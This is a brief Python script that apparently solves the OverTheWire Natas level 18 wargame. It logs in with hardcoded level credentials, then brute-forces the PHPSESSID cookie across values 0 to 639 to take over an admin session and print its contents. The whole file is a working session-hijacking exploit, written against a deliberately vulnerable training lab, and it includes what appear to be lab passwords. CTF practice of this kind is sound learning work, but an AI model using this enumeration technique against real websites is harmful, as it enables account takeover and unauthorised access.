import requests

url = "http://natas18.natas.labs.overthewire.org"
url2 = "http://natas18.natas.labs.overthewire.org/index.php"

s = requests.Session()
#s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
s.auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
r = s.get(url)

for x in range(640):
    cookies = dict(PHPSESSID=str(x))
    r = s.get(url2, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break

